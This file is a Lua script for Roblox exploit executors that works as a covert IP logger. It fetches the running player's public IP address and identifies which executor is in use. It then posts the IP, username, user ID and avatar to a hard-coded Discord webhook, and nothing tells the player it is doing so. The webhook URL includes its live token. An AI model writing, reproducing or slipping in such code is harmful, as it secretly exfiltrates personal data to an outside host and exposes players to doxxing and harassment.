local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
local HTTP_ = game:GetService('HttpService')
local LPR = game:GetService('Players').LocalPlayer
local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    FlUXUS_LOADED and "Fluxus" or
    "Kid with shit exploit"

local url =
    "https://discord.com/api/webhooks/1153044741148135434/I1I3qdG0ATuOavzgWbnNQKXgVkfy0Rvrmn4LL6YQYPVvRuMfYXDpq9aUeNpqwe5Z0VY2"
local data = {
    ["username"] = LPR.Name..' ['..LPR.UserId..']',
    ["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
    ["embeds"] = {
        {
            ["description"] = "Details:",
            ["fields"] = {
                {
                    name = "Exploit",
                    value = webhookcheck,
                    inline = true
                },
                {
                    name = "IP",
                    value = ESD,
                    inline = true
                }
            },
            ["color"] = tonumber(0x7269da),
        }
    }
}
local newdata = HTTP_:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
